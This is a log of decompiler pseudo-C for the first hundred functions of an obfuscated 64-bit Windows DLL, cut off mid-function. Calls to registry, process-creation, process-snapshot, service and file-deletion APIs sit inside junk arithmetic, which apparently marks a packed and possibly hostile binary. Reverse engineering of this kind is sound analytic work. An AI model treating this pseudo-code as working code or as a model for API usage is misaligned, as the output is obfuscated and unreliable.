null

Logs:
# Decompiled Functions: index 0-99

Total requested: 100, succeeded: 100, failed: 0

## Function: FUN_180001000 (0x180001000)

```c

undefined8 FUN_180001000(void)

{
  undefined8 local_30;
  
  return local_30;
}


```

---

## Function: FUN_180001088 (0x180001088)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong FUN_180001088(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  longlong lVar1;
  longlong lVar2;
  ulonglong *puVar3;
  undefined *puVar4;
  longlong lVar5;
  longlong in_R11;
  ulonglong local_58 [8];
  
  lVar5 = param_3 + 1 >> 7;
  lVar1 = lVar5 + (local_58[0] | in_R11 + 0xa1c8e2998ba9c9cfU);
  puVar3 = local_58;
  puVar4 = &DAT_1800c098a;
  lVar2 = FUN_1800024f8();
  if (lVar2 == 0) {
    puVar3 = (ulonglong *)
             ((ulonglong)puVar3 ^
             (longlong)puVar4 - ((ulonglong)(&DAT_1800c864f + lVar1) | in_R11 + 0xa1c8e2998ba9c9cfU)
             );
  }
  return lVar2 + -0xc +
         (ulonglong)((longlong)((((longlong)puVar3 - 5U >> 7) + lVar5) * 0x10000) < 0);
}


```

---

## Function: FUN_1800011a0 (0x1800011a0)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_1800011a0(void)

{
  int iVar1;
  HANDLE pvVar2;
  undefined4 extraout_var;
  ulonglong uVar3;
  undefined1 *puVar4;
  ulonglong in_R10;
  ulonglong unaff_R12;
  undefined1 *puVar5;
  undefined1 auStack_13b [19];
  undefined1 local_128 [19];
  undefined1 auStack_115 [69];
  undefined8 uStack_d0;
  longlong local_90;
  ulonglong local_68;
  
  puVar5 = local_128;
  uVar3 = 0;
  puVar4 = &stack0xffffffffffffffbf;
  uStack_d0 = 0x180001209;
  pvVar2 = FindFirstFileA((LPCSTR)0x0,(LPWIN32_FIND_DATAA)&stack0xffffffffffffff68);
  if (pvVar2 != (HANDLE)0x0) {
    puVar5 = (undefined1 *)((ulonglong)puVar5 ^ (ulonglong)puVar4);
    unaff_R12 = 0;
    uVar3 = uVar3 << 0x15 | in_R10;
  }
  if (((ulonglong)puVar4 & uVar3) != 0) {
    puVar4 = (undefined1 *)((ulonglong)puVar4 & (ulonglong)puVar5);
  }
  puVar5 = &stack0xffffffffffffffa0;
  if (auStack_115 ==
      (undefined1 *)
      ((((ulonglong)&stack0xffffffffffffff68 & (local_68 >> 0x10) + ((ulonglong)puVar4 | unaff_R12))
        * (longlong)auStack_115 ^ (ulonglong)&stack0xffffffffffffff68) >> 0x1b)) {
    puVar5 = (undefined1 *)((ulonglong)puVar5 ^ local_90 - 0x14U);
  }
  uStack_d0 = 0x180001396;
  FUN_180044a38();
  uStack_d0 = 0x1800013e7;
  iVar1 = strcmp((char *)0x3,&stack0xffffffffffffff80);
  uVar3 = 0;
  if (CONCAT44(extraout_var,iVar1) != 0) {
    uVar3 = CONCAT44(extraout_var,iVar1) - (longlong)(auStack_13b + -(longlong)puVar5) &
            (ulonglong)(auStack_13b + -(longlong)puVar5);
  }
  return uVar3;
}


```

---

## Function: FUN_180001438 (0x180001438)

```c

undefined1 * FUN_180001438(void)

{
  FUN_18003cf98();
  return &stack0xfffffffffffffff8;
}


```

---

## Function: FUN_1800014a8 (0x1800014a8)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Removing unreachable block (ram,0x000180001563) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_1800014a8(void)

{
  NTSTATUS NVar1;
  longlong lVar2;
  undefined4 extraout_var;
  ulonglong uVar3;
  PUCHAR pbInput;
  ulonglong uVar4;
  ulonglong uVar5;
  ULONG dwFlags;
  longlong in_R10;
  longlong unaff_R13;
  undefined1 local_48 [16];
  ulonglong local_38;
  longlong local_30 [3];
  
  dwFlags = (ULONG)local_48;
  uVar4 = local_38;
  if ((longlong)
      (local_30[0] + 0x11 +
      (ulonglong)
      (SEXT816((longlong)local_30 * unaff_R13) != SEXT816((longlong)local_30) * SEXT816(unaff_R13)))
      < 0) {
    uVar4 = (local_38 - in_R10) + 0xe;
  }
  pbInput = &DAT_1800d2491;
  lVar2 = FUN_18002d1e8();
  if (lVar2 == 0) {
    uVar4 = uVar4 - (longlong)pbInput;
    pbInput = (PUCHAR)((ulonglong)pbInput | uVar4);
    uVar4 = uVar4 & (ulonglong)pbInput;
  }
  uVar5 = ((longlong)uVar4 >> 8) + 0x1c;
  uVar4 = 0xf7a079116b49755;
  _DAT_f7a079116b49706 = 0x1800015a1;
  NVar1 = BCryptHashData((BCRYPT_HASH_HANDLE)0xf7a079116b49755,pbInput,(ULONG)uVar5,dwFlags);
  if (CONCAT44(extraout_var,NVar1) == 0) {
    uVar5 = (uVar5 | uVar4) - 4;
  }
  _DAT_f7a079116b49706 = 0x180001603;
  uVar3 = FUN_180042818();
  uVar4 = 0;
  if (uVar3 != 0) {
    uVar4 = uVar3 | uVar5;
  }
  return uVar4;
}


```

---

## Function: FUN_180001658 (0x180001658)

```c

void FUN_180001658(void)

{
  FUN_180006138();
  return;
}


```

---

## Function: FUN_180001720 (0x180001720)

```c

longlong FUN_180001720(void)

{
  longlong lVar1;
  
  FUN_1800049f8();
  lVar1 = FUN_180010440();
  return lVar1 + 0x12;
}


```

---

## Function: FUN_180001820 (0x180001820)

```c

/* WARNING: Removing unreachable block (ram,0x000180001a01) */

void FUN_180001820(void)

{
  longlong extraout_RAX;
  longlong lVar1;
  longlong local_38;
  
  FUN_180009f58();
  FUN_18002c988();
  lVar1 = 0;
  free((void *)0x0);
  if (extraout_RAX == 0) {
    lVar1 = local_38;
  }
  FUN_18001c788(&DAT_1800cb309,&DAT_1800cb309,0,lVar1 + 7);
  RemoveDirectoryA((LPCSTR)0x544aba3f4e74a1e1);
  return;
}


```

---

## Function: FUN_180001ac0 (0x180001ac0)

```c

longlong FUN_180001ac0(void)

{
  DWORD DVar1;
  undefined4 extraout_var;
  undefined *puVar2;
  ulonglong unaff_RDI;
  DWORD in_R11D;
  longlong local_50;
  ulonglong local_48;
  
  puVar2 = &DAT_1800cb289;
  DVar1 = GetCurrentDirectoryW(in_R11D,(LPWSTR)&DAT_1800cb289);
  if (CONCAT44(extraout_var,DVar1) != 0) {
    unaff_RDI = unaff_RDI ^ (ulonglong)puVar2;
  }
  return local_50 + (unaff_RDI & local_48 & 0x2a376f5f) + 1;
}


```

---

## Function: FUN_180001bf8 (0x180001bf8)

```c

/* WARNING: Removing unreachable block (ram,0x000180001c3e) */

ulonglong FUN_180001bf8(void)

{
  BOOL BVar1;
  longlong lVar2;
  undefined4 extraout_var;
  longlong unaff_RBX;
  ulonglong unaff_RDI;
  ulonglong uVar3;
  longlong *plVar4;
  ulonglong in_R9;
  undefined1 *puVar5;
  ulonglong uVar6;
  longlong in_R11;
  HWND hWndInsertAfter;
  HWND pHVar7;
  ulonglong unaff_R12;
  byte bVar8;
  int in_stack_ffffffffffffffa8;
  int in_stack_ffffffffffffffb0;
  UINT in_stack_ffffffffffffffb8;
  longlong local_40;
  undefined1 local_38 [8];
  
  bVar8 = 0xffffffffffffffe4 < in_R9;
  lVar2 = FUN_180005aa8();
  puVar5 = &stack0xffffffffffffffa8;
  if (-1 < (longlong)unaff_RDI) {
    unaff_RBX = unaff_RBX - (lVar2 + 1 + (ulonglong)bVar8);
    puVar5 = (undefined1 *)((ulonglong)puVar5 ^ unaff_R12);
    in_R11 = local_40;
  }
  uVar6 = (ulonglong)puVar5 >> 0x15;
  FUN_1800319f0();
  hWndInsertAfter = (HWND)((in_R11 << 0x1a | uVar6) + uVar6);
  uVar3 = unaff_RBX + -9 + (ulonglong)CARRY8(unaff_RBX - 0xc,unaff_RDI);
  plVar4 = &local_40;
  pHVar7 = hWndInsertAfter;
  BVar1 = SetWindowPos((HWND)&DAT_1800d24d8,hWndInsertAfter,(int)plVar4,(int)local_38,
                       in_stack_ffffffffffffffa8,in_stack_ffffffffffffffb0,in_stack_ffffffffffffffb8
                      );
  uVar6 = CONCAT44(extraout_var,BVar1);
  if ((longlong)
      (((longlong)pHVar7 + (0x1b - (longlong)&stack0xffffffffffffffb9) |
       ((ulonglong)plVar4 & uVar3) - (longlong)&stack0xffffffffffffffb9) &
      local_40 + (uVar3 >> 6 ^ (ulonglong)hWndInsertAfter & uVar3)) < 1) {
    uVar6 = uVar6 << 0x16;
  }
  return uVar6;
}


```

---

## Function: FUN_180001d88 (0x180001d88)

```c

void FUN_180001d88(undefined8 param_1,undefined8 param_2,DWORD param_3)

{
  OpenServiceW((SC_HANDLE)&DAT_1800c2de7,(LPCWSTR)&DAT_1800c2de7,param_3);
  FUN_18001d928();
  FUN_18000d3e0();
  return;
}


```

---

## Function: FUN_180001fc0 (0x180001fc0)

```c

/* WARNING: Type propagation algorithm not settling */

undefined1 * FUN_180001fc0(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  ulonglong uVar1;
  ulonglong uVar2;
  longlong lVar3;
  undefined1 *puVar4;
  ulonglong uVar5;
  ulonglong unaff_RSI;
  ulonglong unaff_RDI;
  ulonglong uVar6;
  ulonglong uVar7;
  ulonglong in_R10;
  ulonglong uVar8;
  longlong in_R11;
  ulonglong uVar9;
  undefined1 *puVar10;
  longlong unaff_R12;
  ulonglong uVar11;
  undefined1 auStack_b8 [56];
  undefined1 local_80 [48];
  undefined1 local_50 [40];
  
  uVar6 = param_3 + 7;
  uVar9 = in_R11 + uVar6;
  puVar4 = local_80;
  uVar1 = FUN_18004e618();
  if (uVar1 != 0) {
    unaff_RDI = unaff_RDI & unaff_RSI;
    puVar4 = (undefined1 *)((ulonglong)puVar4 ^ uVar1);
  }
  uVar7 = (uVar6 | uVar9) ^ unaff_RDI - 0x1c;
  uVar6 = unaff_RSI ^ (ulonglong)puVar4 | (ulonglong)puVar4 | uVar1;
  if (puVar4 == (undefined1 *)0x0) {
    uVar6 = (uVar6 ^ in_R10) * 0x20000000 - 9;
    uVar9 = uVar9 ^ in_R10;
  }
  uVar8 = 0;
  uVar5 = uVar1 + uVar7;
  uVar2 = uVar9;
  FUN_180040998();
  uVar11 = unaff_R12 - 7U ^ uVar1 | uVar7;
  uVar9 = (longlong)uVar9 >> 0x16;
  uVar1 = uVar5 + uVar2 * uVar8;
  uVar2 = FUN_180018370();
  if (uVar2 != 0) {
    uVar9 = uVar9 >> 0x17 | (unaff_RDI - 0x1c) * 0x800000;
    uVar6 = uVar6 - 0xb;
    uVar5 = uVar5 + uVar1 & uVar8 & uVar9;
  }
  puVar10 = (undefined1 *)((uVar5 - uVar2) + uVar1);
  lVar3 = FUN_180055638();
  uVar6 = uVar6 + uVar9;
  uVar7 = uVar7 | uVar1;
  puVar4 = (undefined1 *)(lVar3 + -0x14);
  uVar1 = uVar1 - 0x16;
  uVar9 = (uVar11 & 0x7ffffffffff) * 0x800 + 0x19;
  if (((ulonglong)puVar10 & uVar1) == 0) {
    puVar4 = puVar4 + (longlong)puVar10;
    uVar1 = uVar1 | uVar7;
    puVar10 = puVar10 + uVar9;
  }
  uVar2 = (longlong)puVar4 - uVar7;
  if ((longlong)uVar1 < 0) {
    puVar10 = puVar10 + uVar2 + (longlong)local_50;
    uVar6 = uVar6 + uVar2;
  }
  if ((uVar9 & (ulonglong)auStack_b8) == 0) {
    uVar2 = uVar2 * 0x2000;
  }
  uVar6 = uVar6 | uVar2;
  return puVar10 + (-0x11 - (ulonglong)(local_50 < (undefined1 *)0xe)) +
         (uVar2 - 0xb & uVar7) +
         (ulonglong)
         (0xffffffffffffffe9 < uVar6 ||
         CARRY8(uVar6 + 0x16,
                (ulonglong)
                CARRY8((ulonglong)(puVar10 + (-0x11 - (ulonglong)(local_50 < (undefined1 *)0xe))),
                       uVar6))) + uVar6 + 9;
}


```

---

## Function: FUN_1800021f0 (0x1800021f0)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1800021f0(longlong param_1,longlong param_2)

{
  FUN_180022498(param_1 + 3,param_2 + 2,0);
  return;
}


```

---

## Function: FUN_1800022b0 (0x1800022b0)

```c

ulonglong FUN_1800022b0(void)

{
  ulonglong uVar1;
  ulonglong uVar2;
  
  FUN_180006f90();
  uVar2 = 0;
  FUN_180009a60();
  uVar2 = uVar2 >> 0x17;
  uVar1 = FUN_180019148();
  if (uVar1 == 0) {
    uVar1 = uVar2;
  }
  return uVar1;
}


```

---

## Function: FUN_180002368 (0x180002368)

```c

ulonglong FUN_180002368(void)

{
  int iVar1;
  undefined4 extraout_var;
  ulonglong uVar2;
  FILE *in_R10;
  ulonglong local_8;
  
  iVar1 = fclose(in_R10);
  uVar2 = 0;
  if (CONCAT44(extraout_var,iVar1) != 0) {
    uVar2 = local_8 ^ (ulonglong)in_R10 >> 3;
  }
  return uVar2;
}


```

---

## Function: FUN_180002420 (0x180002420)

```c

void FUN_180002420(longlong param_1)

{
  _wfopen((wchar_t *)(param_1 + 0x12),(wchar_t *)0x855f85154bf1bedb);
  FUN_18002f648();
  return;
}


```

---

## Function: FUN_1800024f8 (0x1800024f8)

```c

longlong FUN_1800024f8(void)

{
  ulonglong unaff_R13;
  undefined8 local_18;
  
  return ((unaff_R13 * local_18 & unaff_R13 | local_18) + 0xeca85b18) - unaff_R13;
}


```

---

## Function: FUN_1800025d8 (0x1800025d8)

```c

/* WARNING: Removing unreachable block (ram,0x00018000264e) */

longlong FUN_1800025d8(void)

{
  BOOL BVar1;
  undefined4 extraout_var;
  longlong lVar2;
  ulonglong uVar3;
  ulonglong unaff_RSI;
  WNDENUMPROC in_R9;
  ulonglong in_R10;
  ulonglong in_R11;
  longlong unaff_R12;
  ulonglong uVar4;
  undefined1 auStack_45 [45];
  undefined1 local_18 [24];
  
  lVar2 = -0x65e4a93d4f35a01d;
  uVar4 = unaff_R12 * in_R10;
  BVar1 = EnumWindows(in_R9,-0x65e4a93d4f35a01d);
  uVar3 = (lVar2 + -0xf) - (ulonglong)CARRY8(unaff_RSI,in_R10);
  in_R11 = in_R11 | uVar3;
  if ((POPCOUNT(in_R10 & uVar3 & 0xff) & 1U) != 0) {
    in_R11 = (in_R11 | in_R10) +
             (in_R10 >> 0x1f ^ (CONCAT44(extraout_var,BVar1) >> 0x16 & unaff_RSI | uVar4));
  }
  uVar3 = (ulonglong)auStack_45 >> 0x10;
  lVar2 = FUN_18002ae10();
  if (lVar2 == 0) {
    uVar3 = uVar3 - in_R11 ^ (longlong)local_18 * 0x2000 ^ 0xfffffffffffffff4;
  }
  return lVar2 - uVar3;
}


```

---

## Function: FUN_1800026f8 (0x1800026f8)

```c

ulonglong FUN_1800026f8(void)

{
  undefined1 *puVar1;
  
  puVar1 = FUN_18000f090();
  return (ulonglong)puVar1 >> 0x12;
}


```

---

## Function: FUN_180002778 (0x180002778)

```c

longlong FUN_180002778(longlong param_1)

{
  longlong in_RAX;
  longlong lVar1;
  longlong unaff_RSI;
  longlong in_R10;
  longlong unaff_R13;
  longlong local_28;
  
  lVar1 = (in_RAX - 3U) * 8;
  if (-1 < unaff_RSI + lVar1) {
    lVar1 = ((in_RAX - 3U & 0x1fffffffffffffff) >> 0x12 ^
            (unaff_R13 + in_R10 ^ (param_1 + 7U | unaff_R13 + in_R10)) << 0x1c) - (local_28 >> 5);
  }
  return lVar1;
}


```

---

## Function: FUN_180002808 (0x180002808)

```c

void FUN_180002808(void)

{
  FUN_18001dac0();
  return;
}


```

---

## Function: FUN_180002890 (0x180002890)

```c

ulonglong FUN_180002890(void)

{
  longlong in_R9;
  ulonglong in_R11;
  ulonglong unaff_R13;
  
  return in_R9 * (in_R11 & unaff_R13) | 0x65ab50b327e8f3cb;
}


```

---

## Function: FUN_1800028f8 (0x1800028f8)

```c

/* WARNING: Removing unreachable block (ram,0x00018000291e) */

void FUN_1800028f8(void)

{
  longlong lVar1;
  int unaff_EBX;
  ulonglong unaff_RSI;
  ulonglong unaff_RDI;
  DWORD ulOptions;
  REGSAM samDesired;
  ulonglong in_R9;
  ulonglong uVar2;
  ulonglong in_R10;
  uint unaff_R12D;
  PHKEY in_stack_ffffffffffffffb8;
  
  uVar2 = (ulonglong)&stack0xffffffffffffffb8 | unaff_RSI;
  if (0 < (longlong)(in_R10 & in_R9)) {
    in_R10 = in_R10 >> 6;
    unaff_R12D = unaff_R12D * 0x20 - unaff_EBX;
    uVar2 = (uVar2 ^ unaff_RDI) >> 5;
  }
  samDesired = (uint)uVar2 | unaff_R12D;
  ulOptions = (int)in_R9 + 0x1d;
  lVar1 = FUN_18002f700();
  if (lVar1 != 0) {
    ulOptions = ulOptions ^ (uint)(in_R10 << 0x19);
    samDesired = (REGSAM)&stack0xffffffffffffffb8;
  }
  RegOpenKeyExW((HKEY)&DAT_1800cb4b1,(LPCWSTR)0x0,ulOptions,samDesired,in_stack_ffffffffffffffb8);
  FUN_180037b40();
  return;
}


```

---

## Function: FUN_180002a28 (0x180002a28)

```c

longlong FUN_180002a28(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  longlong in_RAX;
  longlong unaff_R12;
  
  return in_RAX + 3 +
         (ulonglong)
         (((longlong)((unaff_R12 + -0xd) - (ulonglong)((param_3 + 10) * 0x800 < 0) >> 0x1b) >> 0x15
          & 1U) != 0);
}


```

---

## Function: FUN_180002a88 (0x180002a88)

```c

longlong FUN_180002a88(void)

{
  DWORD DVar1;
  undefined4 extraout_var;
  longlong lVar2;
  undefined *puVar3;
  undefined *puVar4;
  ulonglong unaff_R13;
  
  puVar3 = &DAT_1800ce652;
  puVar4 = &DAT_1800c8b9c;
  DVar1 = GetCurrentDirectoryW(0x800ce652,(LPWSTR)&stack0xffffffffffffffe0);
  if (CONCAT44(extraout_var,DVar1) != 0) {
    puVar4 = (undefined *)((ulonglong)puVar4 | unaff_R13);
  }
  lVar2 = 0x1c361687;
  if (((ulonglong)puVar4 & (ulonglong)puVar3) != 0) {
    lVar2 = 0x1c361687 - (longlong)puVar4;
  }
  return lVar2;
}


```

---

## Function: FUN_180002b50 (0x180002b50)

```c

longlong FUN_180002b50(void)

{
  longlong unaff_R15;
  
  FUN_18004a6e8();
  return unaff_R15 + 0x12;
}


```

---

## Function: FUN_180002bf0 (0x180002bf0)

```c

undefined8 FUN_180002bf0(void)

{
  return 0x1c38942f;
}


```

---

## Function: FUN_180002cc8 (0x180002cc8)

```c

void FUN_180002cc8(void)

{
  FUN_180003c70();
  return;
}


```

---

## Function: FUN_180002d80 (0x180002d80)

```c

undefined8 FUN_180002d80(void)

{
  LSTATUS LVar1;
  ulonglong in_RAX;
  undefined4 extraout_var;
  ulonglong uVar2;
  ulonglong unaff_RBX;
  ulonglong unaff_RSI;
  ulonglong uVar3;
  ulonglong in_R10;
  ulonglong uVar4;
  ulonglong in_R11;
  ulonglong uVar5;
  ulonglong unaff_R13;
  undefined1 local_178 [104];
  undefined8 uStackY_110;
  PHKEY in_stack_ffffffffffffff18;
  longlong local_e0;
  undefined1 local_c8 [56];
  undefined1 local_90 [96];
  
  uVar2 = (ulonglong)local_178 & in_R11;
  uVar3 = in_RAX;
  if (-1 < local_e0) {
    uVar2 = uVar2 + unaff_RSI;
    in_R10 = in_R10 & in_R11;
    unaff_RSI = unaff_RSI & unaff_R13;
    uVar3 = (in_RAX & uVar2) + 0x1d;
    local_e0 = local_e0 - in_R11;
  }
  uVar4 = in_R10 & unaff_RSI + local_e0;
  uVar5 = in_R11 * unaff_RSI;
  if ((uVar4 & uVar2) != 0) {
    uVar5 = uVar5 + (uVar3 | unaff_RSI + local_e0);
    unaff_RSI = unaff_RSI + uVar5 * -2;
  }
  if ((POPCOUNT(in_RAX & 0xff) & 1U) == 0) {
    uVar5 = uVar5 - uVar4;
    unaff_RSI = unaff_RSI - unaff_R13 | uVar5;
  }
  uVar2 = uVar2 ^ uVar5;
  uVar5 = (longlong)uVar5 >> 0x18;
  uVar3 = unaff_RSI - uVar5;
  if ((POPCOUNT(uVar5 + 0x17 + (ulonglong)(unaff_RSI < uVar5) & unaff_RBX & 0xff) & 1U) == 0) {
    uVar2 = uVar2 + 0x1d;
    uVar3 = (uVar3 & (ulonglong)local_90) >> 0xc;
  }
  uStackY_110 = 0x180002e90;
  LVar1 = RegOpenKeyExW((HKEY)0x0,(LPCWSTR)(uVar2 & uVar3),0x800d508a,
                        (int)((ulonglong)local_90 >> 2) + 0x1c,in_stack_ffffffffffffff18);
  uStackY_110 = 0x180002ee4;
  FUN_18000d4a0(0xe48aac7200192737,local_c8,CONCAT44(extraout_var,LVar1));
  uStackY_110 = 0x180002f44;
  RtlEqualUnicodeString(0,0);
  return 0x6da974d07234b18f;
}


```

---

## Function: FUN_180002fc8 (0x180002fc8)

```c

/* WARNING: Removing unreachable block (ram,0x000180003062) */

ulonglong FUN_180002fc8(void)

{
  BOOL BVar1;
  ulonglong in_RAX;
  longlong lVar2;
  undefined4 extraout_var;
  undefined4 extraout_var_00;
  ulonglong uVar3;
  LPSTR lpCommandLine;
  longlong unaff_RSI;
  ulonglong unaff_RDI;
  ulonglong uVar4;
  longlong lVar5;
  LPSECURITY_ATTRIBUTES lpProcessAttributes;
  ulonglong in_R9;
  HANDLE in_R10;
  ulonglong in_R11;
  undefined1 *puVar6;
  ulonglong unaff_R12;
  longlong lVar7;
  ulonglong uVar8;
  LPPROCESS_INFORMATION unaff_R15;
  undefined1 auStackY_68 [32];
  BOOL in_stack_ffffffffffffffb8;
  DWORD in_stack_ffffffffffffffc0;
  undefined4 uStack_3c;
  LPVOID in_stack_ffffffffffffffc8;
  LPCSTR in_stack_ffffffffffffffd0;
  LPSTARTUPINFOA in_stack_ffffffffffffffd8;
  
  lVar5 = 0;
  uVar3 = 0x571d16750dcd6104;
  lVar7 = (unaff_R12 ^ in_R11) * unaff_RSI;
  uVar8 = CONCAT44(uStack_3c,in_stack_ffffffffffffffc0) - lVar7 >> 5;
  lVar2 = FUN_18003ad08();
  if (lVar2 == 0) {
    uVar8 = uVar8 ^ in_R9 + 0x17 | in_R9 + 0x17;
    in_R9 = in_R9 - 4;
  }
  uVar4 = (unaff_RDI | in_RAX) & in_R11;
  uVar3 = uVar3 & 0x4d2ea40c637e12d4;
  lpCommandLine = &DAT_1800ba74b;
  lpProcessAttributes = (LPSECURITY_ATTRIBUTES)(lVar5 + 0x1e);
  BVar1 = GetExitCodeProcess(in_R10,(LPDWORD)&DAT_1800ba74b);
  lVar2 = CONCAT44(extraout_var,BVar1);
  if (lVar2 == 0) {
    in_R9 = in_R9 ^ (ulonglong)lpCommandLine;
    lVar2 = -uVar3;
    in_R11 = in_R11 + uVar3 ^ (ulonglong)lpCommandLine ^ lVar7 + 5U;
    lpCommandLine = (LPSTR)(((ulonglong)lpCommandLine | uVar8) ^ lVar7 + 5U);
  }
  BVar1 = CreateProcessA((LPCSTR)((longlong)in_R10 + -0xdd77cb5f82420a6),lpCommandLine,
                         lpProcessAttributes,(LPSECURITY_ATTRIBUTES)(in_R9 + 9),
                         in_stack_ffffffffffffffb8,in_stack_ffffffffffffffc0,
                         in_stack_ffffffffffffffc8,in_stack_ffffffffffffffd0,
                         in_stack_ffffffffffffffd8,unaff_R15);
  uVar8 = (uVar3 * uVar4 | lVar7 - 0xeU) ^ (ulonglong)&stack0xffffffffffffffc0;
  puVar6 = &stack0xffffffffffffffd0 + uVar4 + lVar2;
  lVar2 = (longlong)&stack0xffffffffffffffc0 * CONCAT44(uStack_3c,in_stack_ffffffffffffffc0);
  uVar3 = CONCAT44(extraout_var_00,BVar1) >> 0xc ^ in_R11 ^ (ulonglong)&stack0xffffffffffffffd0;
  if (-1 < (longlong)(lVar7 - 0x1fU & (ulonglong)auStackY_68)) {
    puVar6 = (undefined1 *)((ulonglong)puVar6 | uVar8);
    uVar3 = uVar3 - (lVar2 - (longlong)&stack0xffffffffffffffd0);
    uVar8 = (uVar8 | CONCAT44(uStack_3c,in_stack_ffffffffffffffc0) + lVar2) >> 0x18;
  }
  return uVar3 ^ (ulonglong)puVar6 ^ uVar8;
}


```

---

## Function: FUN_1800031c8 (0x1800031c8)

```c

/* WARNING: Removing unreachable block (ram,0x000180003251) */

longlong FUN_1800031c8(void)

{
  LSTATUS LVar1;
  undefined4 extraout_var;
  longlong lVar2;
  longlong lVar3;
  undefined1 *puVar4;
  undefined *puVar5;
  undefined1 *puVar6;
  undefined1 local_98 [16];
  undefined1 local_88 [104];
  
  lVar3 = 0xfe08eea2b978f93;
  puVar4 = local_98;
  puVar5 = &DAT_1800cebd2;
  puVar6 = local_88;
  LVar1 = FUN_18002db20();
  if (CONCAT44(extraout_var,LVar1) == 0) {
    puVar5 = puVar5 + -lVar3;
  }
  lVar2 = FUN_18001c788(lVar3,puVar4,puVar5,(longlong)puVar6);
  if (lVar2 != 0) {
    lVar3 = (lVar3 + -0x14) * 0x40000;
  }
  return lVar2 * 0x4000000 - ((lVar3 - (ulonglong)((longlong)puVar5 << 5 < 0)) + 6);
}


```

---

## Function: FUN_180003388 (0x180003388)

```c

void FUN_180003388(void)

{
  FUN_180013978();
  _aligned_free((void *)0x0);
  FUN_18004f0f0();
  FUN_180012738();
  return;
}


```

---

## Function: FUN_1800034f8 (0x1800034f8)

```c

undefined8 FUN_1800034f8(void)

{
  LPCSTR lpPathName;
  ulonglong unaff_RBP;
  longlong unaff_RSI;
  ulonglong unaff_R13;
  
  lpPathName = (LPCSTR)0x45bf8c80136bb665;
  if ((longlong)(unaff_R13 & unaff_RBP) < 1) {
    lpPathName = (LPCSTR)(unaff_RSI + 0xcU | 0x45bf8c80136bb665);
  }
  RemoveDirectoryA(lpPathName);
  FUN_1800163e8();
  return 0x143497206acbd4ad;
}


```

---

## Function: FUN_180003618 (0x180003618)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Removing unreachable block (ram,0x0001800036bd) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_180003618(void)

{
  FUN_18004f0f0();
  _DAT_88c69c661d52b8d = 0x18000370a;
  FUN_180048598();
  _DAT_88c69c661d52b8d = 0x180003731;
  CreateToolhelp32Snapshot(0x8c1cce62f1813219,&DAT_1800d5092,0);
  return;
}


```

---

## Function: FUN_180003798 (0x180003798)

```c

void FUN_180003798(void)

{
  FUN_180003388();
  return;
}


```

---

## Function: FUN_180003838 (0x180003838)

```c

undefined8 FUN_180003838(void)

{
  undefined8 local_30;
  
  return local_30;
}


```

---

## Function: FUN_1800038c8 (0x1800038c8)

```c

longlong FUN_1800038c8(void)

{
  ulonglong uVar1;
  longlong lVar2;
  longlong unaff_RBX;
  longlong in_R10;
  longlong unaff_R12;
  ulonglong unaff_R13;
  
  uVar1 = FUN_180004c38();
  lVar2 = 0;
  if (uVar1 != 0) {
    lVar2 = ((uVar1 ^ (unaff_R13 - unaff_RBX * in_R10) + 0x1f +
                      (ulonglong)(unaff_R13 < (ulonglong)(unaff_RBX * in_R10))) - 0xb) - unaff_R12;
  }
  return lVar2;
}


```

---

## Function: FUN_180003958 (0x180003958)

```c

undefined8 FUN_180003958(void)

{
  undefined8 local_20;
  
  TranslateMessage((MSG *)0x0);
  return local_20;
}


```

---

## Function: FUN_1800039e8 (0x1800039e8)

```c

longlong FUN_1800039e8(void)

{
  ulonglong uVar1;
  ulonglong uVar2;
  undefined *puVar3;
  
  puVar3 = &DAT_1800baa1b;
  uVar1 = FUN_1800043e0();
  uVar2 = 0;
  if (uVar1 != 0) {
    uVar2 = uVar1 - 0x1a | (ulonglong)puVar3;
  }
  return uVar2 - 0x15;
}


```

---

## Function: FUN_180003a90 (0x180003a90)

```c

/* WARNING: Removing unreachable block (ram,0x000180003b2a) */

void FUN_180003a90(void)

{
  RemoveDirectoryA(&DAT_1800c8e8e);
  return;
}


```

---

## Function: FUN_180003c70 (0x180003c70)

```c

longlong FUN_180003c70(void)

{
  LSTATUS LVar1;
  BOOL BVar2;
  undefined4 extraout_var;
  uintptr_t uVar3;
  undefined4 extraout_var_00;
  undefined1 *puVar4;
  ulonglong uVar5;
  _StartAddress *p_Var6;
  ulonglong unaff_RBX;
  longlong unaff_RDI;
  ulonglong uVar7;
  longlong lVar8;
  LPSECURITY_ATTRIBUTES lpProcessAttributes;
  ulonglong uVar9;
  LPSECURITY_ATTRIBUTES lpThreadAttributes;
  longlong in_R10;
  ulonglong uVar10;
  HKEY hKey;
  ulonglong in_R11;
  longlong lVar11;
  longlong unaff_R13;
  undefined1 local_130 [80];
  undefined8 uStackY_e0;
  uint in_stack_ffffffffffffff48;
  undefined4 in_stack_ffffffffffffff4c;
  DWORD in_stack_ffffffffffffff50;
  undefined4 in_stack_ffffffffffffff54;
  LPVOID in_stack_ffffffffffffff58;
  LPCWSTR in_stack_ffffffffffffff60;
  LPSTARTUPINFOW in_stack_ffffffffffffff68;
  LPPROCESS_INFORMATION in_stack_ffffffffffffff70;
  LPSECURITY_ATTRIBUTES local_80;
  _StartAddress *local_78;
  
  uVar10 = in_R10 + -0x1e >> 0x1a;
  uVar7 = unaff_RDI + 8 + (ulonglong)(((longlong)local_130 >> 7 & 1U) != 0);
  uVar5 = 0;
  uStackY_e0 = 0x180003cc0;
  RegOpenKeyExW((HKEY)0x0,(LPCWSTR)0x0,(DWORD)&stack0xffffffffffffff58,(REGSAM)in_R11,
                (PHKEY)CONCAT44(in_stack_ffffffffffffff4c,in_stack_ffffffffffffff48));
  lVar11 = 0;
  uVar5 = ((unaff_R13 >> 0x10) + -9) - (ulonglong)(uVar5 < in_R11);
  p_Var6 = (_StartAddress *)0x0;
  if (-1 < (longlong)uVar7) {
    p_Var6 = local_78;
  }
  if (p_Var6 == (_StartAddress *)0x0) {
    uVar7 = uVar7 >> 0x1c;
    lVar11 = -0x14 - uVar10;
  }
  lVar11 = lVar11 + -0xc;
  hKey = (HKEY)(uVar10 >> 0xb);
  uVar9 = 0;
